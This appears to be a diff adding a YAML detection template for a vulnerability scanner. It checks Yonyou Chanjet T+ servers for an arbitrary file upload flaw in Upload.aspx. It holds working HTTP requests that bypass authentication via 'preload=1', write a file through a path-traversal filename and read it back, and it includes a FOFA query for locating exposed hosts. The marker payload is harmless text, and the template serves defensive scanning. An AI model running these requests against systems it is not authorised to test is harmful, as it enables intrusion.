@@ -1,0 +1,60 @@
+id: yonyou-chanjet-tplus-setupaccount-fileupload
+
+info:
+  name: 用友 畅捷通T+ Upload.aspx 任意文件上传漏洞
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |
+    用友 畅捷通T+ Upload.aspx接口存在任意文件上传漏洞,攻击者通过 preload 参数绕过身份验证进行文件上传，控制服务器
+    fofa: app="畅捷通-TPlus"
+  tags: yonyou,chanjet,tplus,fileupload
+  created: 2025/03/13
+  requires: [chanjet]
+  requires-mode: opportunistic
+
+set:
+  filename: randomLowercase(8)
+  rbody: randomLowercase(32)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /tplus/SM/SetupAccount/Upload.aspx?preload=1
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: |
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="File1"; filename="../../../img/login/{{filename}}.txt"
+        Content-Type: image/jpeg
+
+        {{rbody}}
+        ------WebKitFormBoundary{{rboundary}}--
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /tplus/img/login/{{filename}}.txt
+    expression: response.body.bcontains(bytes(rbody))
+    stop_if_match: true
+  r2:
+    request:
+      method: POST
+      path: /tplus/SM/SetupAccount/Upload.aspx?preload=1
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: |
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="File1"; filename="{{filename}}.txt"
+        Content-Type: image/jpeg
+
+        {{rbody}}
+        ------WebKitFormBoundary{{rboundary}}--
+    expression: response.status == 200
+  r3:
+    request:
+      method: GET
+      path: /tplus/SM/SetupAccount/images/{{filename}}.txt?preload=1
+    expression: response.body.bcontains(bytes(rbody))
+expression: (r0() && r1()) || (r2() && r3())
